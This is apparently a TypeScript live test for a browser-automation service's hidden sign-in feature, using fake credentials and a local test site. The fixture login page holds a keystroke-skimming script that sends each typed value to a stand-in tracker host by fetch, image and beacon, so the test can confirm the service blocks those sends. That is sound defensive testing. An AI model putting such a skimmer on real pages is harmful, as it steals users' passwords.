// The live check of the sign-in act in the service's model (board ab-v16.97.4; contract C11, the sign-in act). It runs
// the real service (`agent-browser service --test`, with its pinned agent package: the receiver 0.3.8 of chrome-extension
// 443f968, board ab-v16.97.10) in temp folders only, on one free display, under the harness guard, and it is the
// service's "daemon" on the control door. With `--chrome-extension <checkout>` it also checks that the pinned commit's
// release/agent.crx (`git show`, read only, never packed) is the same bytes as the service's copy. Test values only: a made-up username,
// password and passphrase, named so; the local pages are on *.localhost hosts of a server of this process.
//
//   1. the store: the snapshot, the set-up with a pane's seal, the seal of one credential, the snapshot with it;
//   2. Chrome with the pinned receiver 0.3.8 (its hello has the feature act), the lists, a CDP client of the session's
//      scope;
//   3. the client's own tab of the site shows "not signed in";
//   4. AgentBrowser.signIn on the client's root session: the act window off the screen (its X window to the right of the
//      screen's area while the act runs) and hidden from the client (no target, no event of it), the page's script
//      that sends each typed value to a host outside send_to (a fetch POST, an image, a beacon) blocked, signed in;
//   5. the outcome and the clean end: the sign_in start and end events (signed_in, the block's count), the act window
//      gone, the tracker host got no request of the act tab;
//   6. the move: the client's new tab of the site loads signed in (the cookie and the localStorage token moved);
//   7. the CLI: sign-ins lists the credential, sign-in signs in again, sign-in of another name gets C11's text, exit 1;
//   8. the secret scan: no answer, event, control line, client message, CLI output, log line or profile file holds a
//      test value in any of its five forms; its twin finds a planted one;
//   9. stop: Chrome, Xvfb and the shim end; the temp folders go.
//
// It never touches another Chrome, Xvfb, profile or folder: it signals only the pids that its run started.
//   flock <heavy.lock> timeout 1500 node test/live/sign-in-act/check.ts --display 171 [--chrome-extension <checkout>]

import { execFile, execFileSync, spawn, spawnSync, type ChildProcess } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { connect, type Socket } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { CDPConnection } from "../../../src/cdp.ts";
import { AGENT_CRX, AGENT_CRX_SHA256, AGENT_VERSION, CHROME_EXTENSION_COMMIT, RECEIVER_ID } from "../../../src/service/package/pins.ts";
import { passwordForms } from "../../../src/service/signins/act-rules.ts";
import { GOOGLE_SOURCE, GoogleChromeTools } from "../../../src/service/unit/google-chrome.ts";
import { makeChromeRepo } from "../../chrome-fixture.ts";
import { paneSeal } from "../../sign-in-seal.ts";
import { harnessGuard, reservedDisplay } from "../guard.ts";

const ROOT = fileURLToPath(new URL("../../../", import.meta.url));
const BIN = join(ROOT, "bin", "agent-browser.js");
const arg = (k: string) => { const i = process.argv.indexOf(k); return i > 0 ? process.argv[i + 1] : undefined; };
const display = Number(arg("--display") ?? "171");
// This check runs on :171 or :172 only (review-124 N11); the guard's reserved list holds too.
const refused = reservedDisplay(display, "--display") ?? (![171, 172].includes(display) ? `--display names :${display}: this check runs on :171 or :172 only` : null);
if (!Number.isSafeInteger(display) || refused) { process.stderr.write(`sign-in-act: ${refused ?? "--display must be a number"}\n`); process.exit(2); }
if (existsSync(`/tmp/.X11-unix/X${display}`) || existsSync(`/tmp/.X${display}-lock`)) { process.stderr.write(`sign-in-act: :${display} is in use; this check runs on a free display only\n`); process.exit(2); }
const CE = arg("--chrome-extension");
const CHROMIUM_TREE = "/usr/lib/chromium";

// The test values: made up, named as test values; the canaries of the scan.
const USER = "test-user.live@login.localhost";
const PASS = "Test-Live-Pass-4Kq2-not-a-secret";
const PASSPHRASE = "test passphrase of the live check 2026";
const CANARIES = [USER, PASS, PASSPHRASE];

const t0 = Date.now();
const log = (s: string) => process.stdout.write(`[${((Date.now() - t0) / 1000).toFixed(1)} s] ${s}\n`);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const results: { step: string; ok: boolean; note: string }[] = [];
const check = (step: string, ok: boolean, note = "") => { results.push({ step, ok, note }); log(`${ok ? "PASS" : "FAIL"} ${step}${note ? `: ${note}` : ""}`); if (!ok) throw new Error(`${step} failed${note ? `: ${note}` : ""}`); };
const until = async (what: string, f: () => boolean, ms: number) => { const end = Date.now() + ms; while (!f()) { if (Date.now() > end) throw new Error(`${what}: not in ${ms / 1000} s`); await sleep(100); } };
function proc(pid: number): { start: number; ppid: number; argv: string[] } | null {
  try {
    const st = readFileSync(`/proc/${pid}/stat`, "latin1");
    const f = st.slice(st.lastIndexOf(")") + 2).split(" ");
    if (["Z", "X"].includes(f[0])) return null;
    return { start: Number(f[19]), ppid: Number(f[1]), argv: readFileSync(`/proc/${pid}/cmdline`, "utf8").split("\0").filter(Boolean) };
  } catch { return null; }
}

const guard = await harnessGuard("sign-in-act");
const dir = mkdtempSync(join(tmpdir(), "ab-act-live-"));
const run = join(dir, "run"), state = join(dir, "state"), tools = join(dir, "tools"), lists = join(dir, "lists"), cliState = join(dir, "cli");
for (const d of [run, lists, cliState]) mkdirSync(d, { mode: 0o700 });
const started = new Map<number, number>();
let service: ChildProcess | null = null;
let serviceErr = "";
let repo: ReturnType<typeof makeChromeRepo> | null = null;
/** Every text that the scan reads: control lines, answers, client messages, CLI outputs. */
const seen: string[] = [];

// ---- the local site: login.localhost (the sign-in page, its POST, the signed-in page) and tracker.localhost (it records)
const sessions = new Set<string>();
const tracker: { path: string; body: string; at: number }[] = [];
let actWindow: { from: number; to: number } | null = null;
let port = 0;
const loginPage = (error = "") => `<!doctype html><title>aw-live-sign-in-page</title>
<form method="post" action="/login"><p>${error}</p><input type="email" name="u" autocomplete="username"><input type="password" name="p"><button type="submit">Sign in</button></form>
<script>
for (const el of document.querySelectorAll("input")) el.addEventListener("input", () => {
  const t = "http://tracker.localhost:${0}/";
  try { fetch(t.replace(":0/", ":" + location.port + "/") + "post", { method: "POST", body: el.value, mode: "no-cors" }).catch(() => {}); } catch (e) {}
  try { new Image().src = t.replace(":0/", ":" + location.port + "/") + "img?v=" + btoa(unescape(encodeURIComponent(el.value))); } catch (e) {}
  try { navigator.sendBeacon(t.replace(":0/", ":" + location.port + "/") + "beacon", el.value); } catch (e) {}
});
</script>`;
const http = createServer((req, res) => {
  const host = String(req.headers.host ?? "").split(":")[0];
  let body = "";
  req.on("data", (d) => { body += d; });
  req.on("end", () => {
    if (host === "tracker.localhost") { tracker.push({ path: req.url ?? "", body, at: Date.now() }); res.writeHead(204, { "Access-Control-Allow-Origin": "*" }).end(); return; }
    if (host !== "login.localhost") { res.writeHead(404).end(); return; }
    const cookie = /(?:^|;\s*)test_session=([0-9a-f]+)/.exec(String(req.headers.cookie ?? ""))?.[1];
    if (req.method === "POST" && req.url === "/login") {
      const f = new URLSearchParams(body);
      if (f.get("u") === USER && f.get("p") === PASS) {
        const sid = randomBytes(16).toString("hex");
        sessions.add(sid);
        res.writeHead(303, { "Set-Cookie": `test_session=${sid}; Path=/; HttpOnly; SameSite=Lax`, Location: "/home" }).end();
      } else res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" }).end(loginPage("not accepted"));
      return;
    }
    if (req.url === "/login") { res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" }).end(loginPage()); return; }
    const signedIn = cookie !== undefined && sessions.has(cookie);
    res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" }).end(`<!doctype html><title>home</title><p id="state">${signedIn ? "signed in" : "not signed in"}</p>${signedIn ? `<script>localStorage.setItem("test_token", "test-token-1")</script>` : ""}`);
  });
});

type Door = { s: Socket; lines: any[]; next: (want: (l: any) => boolean, ms?: number) => Promise<any>; send: (o: object) => void };
function door(): Promise<Door> {
  return new Promise((resolve, reject) => {
    const s = connect(join(run, "control.sock"));
    const lines: any[] = [];
    let buf = "";
    const waiters: { want: (l: any) => boolean; done: (l: any) => void }[] = [];
    s.on("data", (d) => { buf += d; let i; while ((i = buf.indexOf("\n")) >= 0) { const raw = buf.slice(0, i); seen.push(raw); const l = JSON.parse(raw); buf = buf.slice(i + 1); lines.push(l); for (const w of [...waiters]) if (w.want(l)) { waiters.splice(waiters.indexOf(w), 1); w.done(l); } } });
    s.on("error", reject);
    s.once("connect", () => resolve({
      s, lines, send: (o) => s.write(JSON.stringify(o) + "\n"),
      next: (want, ms = 30_000) => { const hit = lines.find(want); if (hit) return Promise.resolve(hit); return new Promise((done, fail) => { const w = { want, done: (l: any) => { clearTimeout(t); done(l); } }; waiters.push(w); const t = setTimeout(() => { waiters.splice(waiters.indexOf(w), 1); fail(new Error(`no such line in ${ms} ms`)); }, ms); }); },
    }));
  });
}
let n = 0;
const req = async (d: Door, op: string, by: object, fields: object = {}, ms = 30_000) => { const id = `q${++n}`; d.send({ t: "req", id, op, by, ...fields }); return d.next((l) => l.t === "res" && l.id === id, ms); };
const TOKEN = { kind: "token", user: "live", via: "cli" }, DAEMON = { kind: "daemon", user: "live", via: "daemon" }, OPERATOR = { kind: "operator", user: "live", via: "web" };
const me = proc(process.pid)!;

/** X windows of the run's own display (its Xvfb, its X authority): their name and place. */
function xWindows(): { id: string; name: string; x: number; y: number; w: number; h: number }[] {
  const env = { DISPLAY: `:${display}`, XAUTHORITY: join(state, "xauth") };
  const ids = spawnSync("xdotool", ["search", "--onlyvisible", "--name", ".*"], { env, encoding: "utf8", timeout: 3000 }).stdout.split("\n").filter((l) => /^\d+$/.test(l));
  return ids.map((id) => {
    const name = spawnSync("xdotool", ["getwindowname", id], { env, encoding: "utf8", timeout: 3000 }).stdout.trim();
    const g = spawnSync("xdotool", ["getwindowgeometry", id], { env, encoding: "utf8", timeout: 3000 }).stdout;
    const p = /Position:\s*(-?\d+),(-?\d+)/.exec(g), s = /Geometry:\s*(\d+)x(\d+)/.exec(g);
    return { id, name, x: Number(p?.[1] ?? NaN), y: Number(p?.[2] ?? NaN), w: Number(s?.[1] ?? NaN), h: Number(s?.[2] ?? NaN) };
  });
}

async function startService(): Promise<Door> {
  service = spawn(process.execPath, ["--disable-sigusr1", BIN, "service", "--test", "--test-display", String(display), "--agent-door", join(run, "cdp.sock"), "--control-door", join(run, "control.sock"),
    "--daemon-command", join(dir, "daemon-command.json"), "--lists-folder", lists, "--state-folder", state, "--tools-dir", tools, "--test-chrome-source", join(dir, "source.json")], { stdio: ["ignore", "ignore", "pipe"] });
  guard.track(service.pid, "service");
  started.set(service.pid!, proc(service.pid!)?.start ?? -1);
  service.stderr!.on("data", (d) => { serviceErr += d; });
  for (let i = 0; i < 300 && !serviceErr.includes("service: ready"); i++) { if (service.exitCode !== null) break; await sleep(50); }
  if (!serviceErr.includes("service: ready")) throw new Error(`the service did not start: ${serviceErr.slice(-800)}`);
  const d = await door();
  const hello = await d.next((l) => l.t === "hello");
  check("the service's hello lists the stored sign-ins (sign_ins)", hello.side === "service" && hello.features.includes("sign_ins"), JSON.stringify(hello.features));
  d.send({ t: "hello", v: 1, side: "daemon", version: "live", features: [] });
  const cfg = await req(d, "config", { kind: "daemon", user: "live", via: "config" }, { enabled: true, control: true, chrome_bin: null, chrome_args: [], display_size: "1280x900" });
  if (!cfg.ok) throw new Error(`config: ${JSON.stringify(cfg)}`);
  const ss = await req(d, "set_sessions", DAEMON, { sessions: [{ scope: "live-1", repo: "local/test", roots: [{ pid: process.pid, start: me.start }], cgroup: null, lifetime_id: "lt-live", mcp_token: null }], remote: [], box: { hosts: ["box.localhost"], cookie_names: [] } });
  if (!ss.ok) throw new Error(`set_sessions: ${JSON.stringify(ss)}`);
  return d;
}
async function stopService(): Promise<void> {
  const s = service;
  if (!s || s.exitCode !== null) return;
  const exited = new Promise<void>((r) => s.once("exit", () => r()));
  s.kill("SIGTERM");
  await Promise.race([exited, sleep(15_000).then(() => { s.kill("SIGKILL"); })]);
}
const track = (pid: number | null | undefined, name: string) => { if (!pid) return; const p = proc(pid); if (p) { started.set(pid, p.start); guard.track(pid, name); } };
/** The CLI as a child, with no block of this process's event loop: the local site of this process must keep answering. */
const cli = (args: string[], url: string) => new Promise<{ status: number | null; stdout: string; stderr: string }>((resolve) => {
  execFile(process.execPath, [BIN, ...args, "--state-dir", cliState, "--cdp-url", url], { encoding: "utf8", timeout: 240_000 }, (e, stdout, stderr) => {
    seen.push(stdout, stderr);
    resolve({ status: e ? (typeof (e as any).code === "number" ? (e as any).code : null) : 0, stdout, stderr });
  });
});

let code = 0;
try {
  // The service's pinned agent package (the receiver 0.3.8); with a checkout, the same bytes as the pinned commit's file.
  const crx = readFileSync(AGENT_CRX);
  check(`the service's agent package is the pinned CRX of receiver ${AGENT_VERSION} (SHA-256 ${AGENT_CRX_SHA256.slice(0, 8)}...)`, createHash("sha256").update(crx).digest("hex") === AGENT_CRX_SHA256 && AGENT_VERSION === "0.3.8", `${crx.length} bytes`);
  if (CE) {
    const fromGit = execFileSync("git", ["-C", CE, "show", `${CHROME_EXTENSION_COMMIT.slice(0, 7)}:release/agent.crx`], { maxBuffer: 1 << 24 });
    check(`git show ${CHROME_EXTENSION_COMMIT.slice(0, 7)}:release/agent.crx gives the same bytes as the service's copy`, fromGit.equals(crx));
  }
  const argv = readFileSync("/proc/self/cmdline", "utf8").split("\0").filter((x, i, a) => i < a.length - 1 || x !== "");
  writeFileSync(join(dir, "daemon-command.json"), JSON.stringify({ v: 1, interpreter: realpathSync(process.execPath), args: argv.slice(1) }), { mode: 0o600 });
  repo = makeChromeRepo({ version: "158.0.7100.1-1", chrome: `#!/bin/sh\nif [ "$1" = "--version" ]; then echo "Google Chrome 158.0.7100.1 "; exit 0; fi\nexec "$(dirname "$0")/chromium" "$@"\n` });
  writeFileSync(join(dir, "source.json"), JSON.stringify({ repo: repo.repo, key: repo.keyFile, fingerprints: [repo.fingerprint] }));
  chmodSync(dir, 0o700);
  const installer = new GoogleChromeTools({ tools, source: { ...GOOGLE_SOURCE, repo: repo.repo, keyFile: repo.keyFile, fingerprints: [repo.fingerprint] }, log: (l) => log(`installer: ${l}`) });
  const copy = await installer.ensure();
  for (const e of readdirSync(CHROMIUM_TREE)) cpSync(join(CHROMIUM_TREE, e), join(copy.binary, "..", e), { recursive: true, force: true });
  await new Promise<void>((r) => http.listen(0, "127.0.0.1", () => r()));
  port = (http.address() as { port: number }).port;
  const ORIGIN = `http://login.localhost:${port}`;
  writeFileSync(join(lists, "local.test.json"), JSON.stringify({ allow: ["login.localhost", "tracker.localhost"], repo: "local/test" }), { mode: 0o600 });

  // 1. The store: the snapshot, the set-up, the seal of one credential, the snapshot with it.
  const d = await startService();
  check("the snapshot of an empty store", (await req(d, "sign_ins", DAEMON, { key: null, records: [] })).ok === true);
  const paneKey = (await req(d, "status", DAEMON)).data.sign_ins.pane_key as string;
  const at = () => new Date().toISOString().replace(/\.\d{3}Z$/, "Z");
  const setup = await req(d, "sign_ins_setup", OPERATOR, { sealed: paneSeal(paneKey, { passphrase: PASSPHRASE }, { op: "sign_ins_setup" }, { at: at() }) }, 60_000);
  check("sign_ins_setup with the pane's seal of a test passphrase opens the store", setup.ok === true && !!setup.data.key, JSON.stringify(setup).slice(0, 200));
  check("the snapshot with the key", (await req(d, "sign_ins", DAEMON, { key: setup.data.key, records: [] })).ok === true);
  const record = { id: "c-0000a11e", name: "staging", origin: ORIGIN, path: "/login", send_to: [ORIGIN] };
  const sealed = await req(d, "sign_in_seal", OPERATOR, { record, offer: false, sealed: paneSeal(paneKey, { username: USER, password: PASS }, { op: "sign_in_seal", record, offer: false }, { at: at() }) });
  check("sign_in_seal seals the test credential (its id in the seal's binding)", sealed.ok === true && sealed.data.record.approved === true, JSON.stringify(sealed).slice(0, 160));
  const file = { ...sealed.data.record, state: "usable", added: null, changed: null, sealed: sealed.data.sealed };
  check("the snapshot with the record", (await req(d, "sign_ins", DAEMON, { key: setup.data.key, records: [file] })).ok === true);
  check("status: the store is open with one record", (await req(d, "status", DAEMON)).data.sign_ins.state === "open");

  // 2. Chrome with the pinned receiver 0.3.8, its hello with the feature act; the lists; a client of the scope.
  const a1 = await req(d, "start", TOKEN, {}, 120_000);
  check("start answers ok", a1.ok === true, JSON.stringify(a1));
  const ready = await d.next((l) => l.t === "ev" && l.ev === "ready");
  track(ready.chrome_pid, "chrome");
  track(JSON.parse(readFileSync(join(state, "unit.json"), "utf8")).xvfb_pid, "xvfb");
  check(`the ready event carries the pinned receiver ${AGENT_VERSION}`, ready.extension_version === AGENT_VERSION, JSON.stringify(ready));
  const prefs = JSON.parse(readFileSync(join(state, "profile", "Default", "Preferences"), "utf8"));
  check("Chrome's preferences: the receiver allowed in incognito, no password saving, no leak check", prefs.extensions?.settings?.[RECEIVER_ID]?.incognito === true && prefs.credentials_enable_service === false && prefs.profile?.password_manager_leak_detection === false);
  await until("the receiver confirms the lists", () => /lists: the receiver took the lists of 1 scopes/.test(serviceErr), 60_000);
  check(`the receiver ${AGENT_VERSION} said hello on the link`, serviceErr.includes(`link: the receiver ${AGENT_VERSION} said hello (bridge, scopes)`), serviceErr.match(/link: the receiver.*/)?.[0] ?? "");
  const url = (await req(d, "endpoint", DAEMON, { scope: "live-1" })).data.url as string;
  let cdp: CDPConnection | null = null;
  for (let i = 0; i < 50 && !cdp; i++) { try { cdp = await CDPConnection.connect(url, 5000); } catch (e) { if (i === 49) throw e; await sleep(200); } }
  const c = cdp!;
  const events: string[] = [];
  for (const m of ["Target.targetCreated", "Target.targetInfoChanged", "Target.attachedToTarget", "Target.targetDestroyed", "Target.detachedFromTarget"]) c.on(m, (p) => { events.push(JSON.stringify({ m, p })); seen.push(JSON.stringify(p)); });
  await c.send("Target.setDiscoverTargets", { discover: true });
  const text = async (sid: string) => { for (let i = 0; i < 50; i++) { const v = (await c.send("Runtime.evaluate", { expression: "document.getElementById('state') ? document.getElementById('state').textContent : ''", returnByValue: true }, sid)).result.value; if (v) return v; await sleep(200); } return ""; };
  const open = async (u: string) => { const { targetId } = await c.send("Target.createTarget", { url: u }); const { sessionId } = await c.send("Target.attachToTarget", { targetId, flatten: true }); return { targetId, sessionId }; };

  // 3. Before the act: not signed in.
  const t1 = await open(`${ORIGIN}/home`);
  check("before the act the client's own tab of the site is not signed in", (await text(t1.sessionId)) === "not signed in");

  // 4. The act: watch the X windows and the client's targets while it runs.
  const before = new Set(((await c.send("Target.getTargets")).targetInfos as any[]).map((t) => t.targetId));
  const xSeen: { name: string; x: number; y: number; w: number; h: number }[] = [];
  const targetsSeen = new Set<string>();
  let watching = true;
  const watch = (async () => {
    while (watching) {
      for (const w of xWindows()) if (/aw-live-sign-in-page|aw-act-/.test(w.name)) xSeen.push(w);
      for (const t of (await c.send("Target.getTargets")).targetInfos as any[]) targetsSeen.add(`${t.targetId} ${t.url}`);
      await sleep(150);
    }
  })();
  const actFrom = Date.now();
  const answer = await c.send("AgentBrowser.signIn", { name: "staging" }, undefined, 240_000);
  actWindow = { from: actFrom, to: Date.now() };
  watching = false;
  await watch;
  seen.push(JSON.stringify(answer));
  check("AgentBrowser.signIn answers signed in", answer.signedIn === true && answer.name === "staging" && answer.origin === ORIGIN, JSON.stringify(answer));
  const page = xSeen.filter((w) => /aw-live-sign-in-page/.test(w.name));
  check("the sign-in page's X window was outside the screen each time that the watch saw it (to the right of the 1280 px screen)", page.length > 0 && page.every((w) => w.x >= 1280), `${page.length} looks: ${JSON.stringify(page.slice(0, 3))}`);
  check("the act window's title marker was outside the screen once the page loaded (the move before the page)", xSeen.every((w) => !/aw-live-sign-in-page/.test(w.name) || w.x >= 1280));
  // The act's page is the path /login (the host login.localhost is in every URL of the site, the client's own tabs too).
  const actPage = (u: string) => { try { return new URL(u).pathname === "/login" || u.startsWith("about:blank"); } catch { return false; } };
  check("the client saw no target of the act: Target.getTargets during the act held only its own tabs", ![...targetsSeen].some((t) => actPage(t.split(" ")[1] ?? "")) && [...targetsSeen].every((t) => before.has(t.split(" ")[0])), [...targetsSeen].join(", "));
  check("no Target event of the client named the act tab or its page", !events.some((e) => /localhost:\d+\/login\b|aw-act-|aw-live-sign-in-page/.test(e)), `${events.length} events`);

  // 5. The outcome and the clean end.
  const start = d.lines.find((l) => l.t === "ev" && l.ev === "sign_in" && l.phase === "start");
  const end = await d.next((l) => l.t === "ev" && l.ev === "sign_in" && l.phase === "end");
  check("the sign_in events: a start and an end with the act id, signed_in, the credential, no host", !!start && start.act === end.act && end.result === "signed_in" && end.id === "c-0000a11e" && end.scope === "live-1", JSON.stringify(end));
  check("the end counts the requests that the block stopped (the page's sends to the tracker host)", end.blocked > 0, `blocked ${end.blocked}, guarded ${end.guarded}`);
  const actHits = tracker.filter((r) => r.at >= actWindow!.from && r.at <= actWindow!.to);
  check("the tracker host outside send_to got no request during the act (the fetch POST, the image, the beacon of each typed value)", actHits.length === 0, `${actHits.length} requests`);
  check("no request of the tracker host holds a test value", !tracker.some((r) => CANARIES.some((v) => passwordForms(v).some((f) => r.path.includes(f) || r.body.includes(f)))));
  await sleep(500);
  check("the clean end: no X window of the act is left (act_end closed it)", !xWindows().some((w) => /aw-live-sign-in-page|aw-act-/.test(w.name)));
  check("the clean end: no act_end failed", !/act_end failed/.test(serviceErr));

  // 6. The move: a new tab of the client loads signed in.
  const t2 = await open(`${ORIGIN}/home`);
  check("after the move the client's new tab of the site is signed in (the cookie moved)", (await text(t2.sessionId)) === "signed in");
  await c.send("Runtime.evaluate", { expression: `fetch("http://tracker.localhost:${port}/control").then(() => 1, () => 0)`, awaitPromise: true }, t2.sessionId);
  await sleep(300);
  check("after the act the tracker host is reachable again from the agent's own tab (the act's rules are gone)", tracker.some((r) => r.path === "/control"));

  // 7. The CLI: sign-ins, sign-in again, sign-in of another name.
  const list = await cli(["sign-ins", "--json"], url);
  check("agent-browser sign-ins lists the credential", list.status === 0 && JSON.parse(list.stdout).signIns.some((x: any) => x.name === "staging" && x.origin === ORIGIN), list.stdout + list.stderr);
  const again = await cli(["sign-in", "staging"], url);
  check("agent-browser sign-in staging signs in again", again.status === 0 && again.stdout === `Signed in to ${ORIGIN}. Your tabs of this site were closed for the sign-in; open the site again: it loads signed in.\n`, again.stdout + again.stderr.slice(-300));
  const other = await cli(["sign-in", "missing"], url);
  check("agent-browser sign-in of another name gets C11's text and exits 1", other.status === 1 && other.stderr === "agent-browser: Not signed in: There is no stored sign-in named missing for this repo.\n", other.stderr);

  // 8. The secret scan, with its twin.
  const forms = CANARIES.flatMap((v) => passwordForms(v));
  const holds = (t: string) => forms.some((f) => t.includes(f));
  check("the scan's twin finds a planted test value", holds(`x ${Buffer.from(PASS).toString("base64url")} y`));
  check("no control line, answer, event, client message or CLI output holds a test value", !seen.some(holds));
  check("no log line of the service holds a test value", !holds(serviceErr));
  const bytes = forms.map((f) => Buffer.from(f, "utf8"));
  const profileHits: string[] = [];
  const walk = (p: string) => {
    for (const e of readdirSync(p, { withFileTypes: true })) {
      const f = join(p, e.name);
      if (e.isDirectory()) walk(f);
      else if (e.isFile() && statSync(f).size < 64 << 20) { const b = readFileSync(f); if (bytes.some((x) => b.includes(x))) profileHits.push(f.slice(state.length)); }
    }
  };
  walk(join(state, "profile"));
  check("no file of the profile holds a test value (History, Login Data, Web Data, Cookies, Local Storage, Preferences)", profileHits.length === 0, profileHits.join(", "));

  // 9. Stop.
  await c.close();
  const st = await req(d, "stop", TOKEN, {}, 30_000);
  check("stop answers ok", st.ok === true);
  d.s.end();
  await stopService();
} catch (e) {
  code = 1;
  log(`FAIL: ${(e as Error).message}`);
  if (serviceErr) log(`the service's log (end):\n${serviceErr.slice(-4000).split("\n").filter((l) => !CANARIES.some((v) => l.includes(v))).join("\n")}`);
} finally {
  await stopService();
  http.close();
  for (const sig of ["SIGTERM", "SIGKILL"] as const) {
    for (const [pid, start] of started) if (proc(pid)?.start === start) { try { process.kill(pid, sig); } catch {} }
    await sleep(2000);
  }
  const left = [...started].filter(([pid, start]) => proc(pid)?.start === start).map(([pid]) => pid);
  repo?.close();
  rmSync(dir, { recursive: true, force: true });
  log(`cleanup: ${left.length ? `still running: ${left.join(", ")}` : "no process of this run runs"}; the temp folder is ${existsSync(dir) ? "still there" : "removed"}`);
  if (left.length) code = 1;
  process.stdout.write(`${JSON.stringify({ passed: results.filter((r) => r.ok).length, failed: results.filter((r) => !r.ok).length + (code && results.every((r) => r.ok) ? 1 : 0), seconds: Math.round((Date.now() - t0) / 1000) })}\n`);
  process.exit(code);
}
